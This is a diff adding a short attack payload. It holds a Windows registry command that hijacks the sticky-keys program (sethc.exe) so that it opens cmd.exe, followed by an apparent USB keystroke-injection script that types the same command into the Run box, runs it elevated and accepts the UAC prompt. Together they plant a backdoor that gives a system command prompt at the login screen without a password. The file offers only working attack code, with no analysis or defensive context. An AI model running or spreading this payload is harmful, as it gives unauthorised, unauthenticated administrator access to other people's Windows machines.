@@ -1,0 +1,12 @@
+cmd.exe /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f"
+
+------------------------------------------------------------------------------------------------------
+
+DELAY 1500
+GUI r
+DELAY 1000
+STRING cmd.exe /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f"
+DELAY 400
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
